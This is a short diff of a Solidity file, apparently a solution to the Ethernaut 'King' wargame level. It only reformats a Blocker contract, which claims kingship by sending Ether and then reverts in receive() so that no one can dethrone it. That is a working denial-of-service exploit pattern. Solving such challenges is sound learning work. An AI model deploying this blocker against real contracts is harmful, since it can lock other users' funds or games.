@@ -24,19 +24,19 @@ contract King {
     }
 }
 
-
 contract Blocker {
     King public king;
-    
+
     constructor(address _king) payable {
         king = King(payable(_king));
     }
-    function ClaimKing() payable public {
+
+    function ClaimKing() public payable {
         // Become the king by sending enough Ether
         (bool success,) = address(king).call{value: msg.value}("");
         require(success, "Failed to become king");
     }
-    
+
     receive() external payable {
         // Intentionally left blank to block receiving Ether
         revert("I refuse to give you kingmanship !");
